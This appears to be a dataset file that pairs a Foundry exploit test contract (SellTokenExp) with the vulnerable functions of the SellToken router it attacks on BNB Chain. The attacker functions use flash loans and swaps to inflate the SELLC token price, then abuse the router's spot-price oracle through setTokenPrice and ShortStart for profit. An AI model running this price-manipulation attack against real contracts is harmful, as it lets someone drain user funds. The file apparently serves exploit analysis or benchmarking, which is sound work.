[
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        uint256 balance = wbnb.balanceOf(address(this));\n        if (data.length > 20) {\n            balance -= 10 ether;\n        }\n        //emit log_named_decimal_uint(\"WBNB before\", wbnb.balanceOf(address(this)), 18);\n        uint256 swap_balance = balance * 99 / 100;\n        uint256 short_balance = balance - swap_balance;\n        wbnb.withdraw(short_balance);\n        // 1. lift price\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(SELLC);\n        wbnb.approve(address(p_router), type(uint256).max);\n        SELLC.approve(address(p_router), type(uint256).max);\n        //emit log_named_decimal_uint(\"SELLC price before\", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n        p_router.swapExactTokensForTokens(swap_balance, 0, path, address(this), block.timestamp + 1000);\n        //emit log_named_decimal_uint(\"swap_balance:  \", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n\n        // 2. short SELLC\n        if (data.length > 20) {\n            s_router.setTokenPrice(address(SELLC));\n            //emit log_named_decimal_uint(\"SELLC price before\", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n        } else {\n            //emit log_named_decimal_uint(\"SELLC price after\", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n            s_router.ShortStart{value: address(this).balance}(address(SELLC), address(this), 1);\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_168_034);\n        deal(address(wbnb), address(this), 10 ether);\n        payable(0x0).transfer(address(this).balance);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SellTokenExp",
    "source_type": "attacker_contract",
    "function_name": "testExp",
    "original_code": "    function testExp() external {\n        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes(\"a123456789012345678901234567890\"));\n        vm.warp(block.timestamp + 100);\n\n        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes(\"abc\"));\n\n        emit log_named_decimal_uint(\"WBNB total profit\", wbnb.balanceOf(address(this)) - 10 ether, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISellTokenRouter",
    "source_type": "victim_contract",
    "function_name": "ShortStart",
    "original_code": "    function ShortStart(address coin,address addr,uint terrace)payable public {\n        address bnbOrUsdt=mkt.getPair(coin);\n        require(terraces[terrace]!=address(0) && tokenPrice[addr][coin] > 0);\n        require(coin != address(0));\n        require(bnbOrUsdt == _WBNB || bnbOrUsdt==_USDT);\n        require(!getNewTokenPrice(addr,coin,bnbOrUsdt) && block.timestamp > tokenPriceTime[addr][coin]);\n        uint bnb=msg.value;\n        uint tos=getToken2Price(coin,bnbOrUsdt,mkt.balanceOf(coin))/10;\n        require(Short[addr][coin].bnb+bnb <= tos);\n        Short[addr][coin].token=bnbOrUsdt;\n        Short[addr][coin].coin=coin;\n        Short[addr][coin].bnb+=bnb*98/100;\n        tokenPrice[addr][coin]=0;\n        uint newTokenValue=getTokenPrice(coin,bnbOrUsdt,bnb*98/100);\n        Short[addr][coin].tokenPrice+=newTokenValue;\n        Short[addr][coin].time=block.timestamp;\n        address[] memory add=mySells[addr].coin;\n        bool isCoin;\n        for(uint i=0;i<add.length;i++){\n             if(add[i]==coin){\n               isCoin=true;\n            }\n        }\n        if(!isCoin){\n           mySells[addr].mnu++;\n           mySells[addr].coin.push(coin);\n        }\n        sum+=bnb;\n        payable(mkt).transfer(bnb*97/100);\n        if(bnbOrUsdt ==_USDT){\n           uint usdts=IERC20(_USDT).balanceOf(address(mkt));\n           mkt.buy(_WBNB,_USDT,bnb*97/100);\n          if(IERC20(_USDT).balanceOf(address(mkt))>usdts){\n             uint ut=IERC20(_USDT).balanceOf(address(mkt))-usdts;\n             mkt.buy(_USDT,coin,ut);\n           }\n        }else{\n            mkt.buy(bnbOrUsdt,coin,bnb*97/100);\n        }\n        payable (owner()).transfer(bnb*2/100);\n        payable (terraces[terrace]).transfer(bnb/100);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ISellTokenRouter",
    "source_type": "victim_contract",
    "function_name": "getToken2Price",
    "original_code": "    function getToken2Price(address token,address bnbOrUsdt,uint bnb) view public returns(uint){\n        if(token == address(0) || bnbOrUsdt == address(0)) return 0;\n        address isbnb;\n        if(bnbOrUsdt == _WBNB){\n            isbnb=_WBNB;\n            address[] memory routePath = new address[](2);\n            routePath[0] = token;\n            routePath[1] = isbnb;\n            return IRouter(_router).getAmountsOut(bnb,routePath)[1];\n        }else {\n            isbnb=_USDT;\n            address[] memory routePath = new address[](3);\n            routePath[0] = token;\n            routePath[1] = isbnb;\n            routePath[2] = _WBNB;\n            return IRouter(_router).getAmountsOut(bnb,routePath)[2];\n        }\n        \n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ISellTokenRouter",
    "source_type": "victim_contract",
    "function_name": "setTokenPrice",
    "original_code": "    function setTokenPrice(address _token)public {\n        address bnbOrUsdt=mkt.getPair(_token);\n        require(bnbOrUsdt == _WBNB || bnbOrUsdt==_USDT);\n        tokenPrice[_msgSender()][_token]=getToken2Price(_token,bnbOrUsdt,1 ether);\n        tokenPriceTime[_msgSender()][_token]=block.timestamp+30;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ISellTokenRouter",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(address token)public {\n        require(Short[_msgSender()][token].bnb>0);\n        require(Short[_msgSender()][token].time>0);\n        require(Short[_msgSender()][token].tokenPrice>0);\n        require(Short[_msgSender()][token].coin != address(0));\n        require(Short[_msgSender()][token].token != address(0));\n        uint tokens=mkt.balanceOf(Short[_msgSender()][token].coin)/10;\n        uint getBNB=getMyShort(token,Short[_msgSender()][token].token,Short[_msgSender()][token].bnb,Short[_msgSender()][token].tokenPrice);\n        uint getTokens=getTokenPrice(token,address(Short[_msgSender()][token].token),getBNB);\n        if(getTokens >= tokens){\n            mkt.sell(token,Short[_msgSender()][token].token,tokens,_msgSender());\n            mkt.setPools(token,tokens,false);\n        }else {\n            mkt.sell(token,Short[_msgSender()][token].token,getTokens,_msgSender());\n            mkt.setPools(token,getTokens,false);\n        }\n        settleAccounts+=Short[_msgSender()][token].bnb;\n        Short[_msgSender()][token].bnb=0;\n        Short[_msgSender()][token].time=0;\n        Short[_msgSender()][token].coin=address(0);\n        Short[_msgSender()][token].tokenPrice=0;\n        address[] memory add=mySells[_msgSender()].coin;\n           uint tmp;\n           for(uint i=0;i<add.length;i++){\n             if(add[i]==token){\n               tmp=i;\n               break;\n            }\n           }\n           address lastTokenIndex=mySells[_msgSender()].coin[add.length-1];\n           if(add.length>1){\n             delete mySells[_msgSender()].coin[add.length-1];\n             mySells[_msgSender()].coin[tmp]=lastTokenIndex;\n             mySells[_msgSender()].coin.pop();\n           }else {\n               delete mySells[_msgSender()].coin;\n               //mySells[_msgSender()].coin.pop();\n           }\n        if(!isAdd[token]){\n             allAddress.push(token);\n             isAdd[token]=true;\n        }\n    }\n    \n",
    "description": ""
  }
]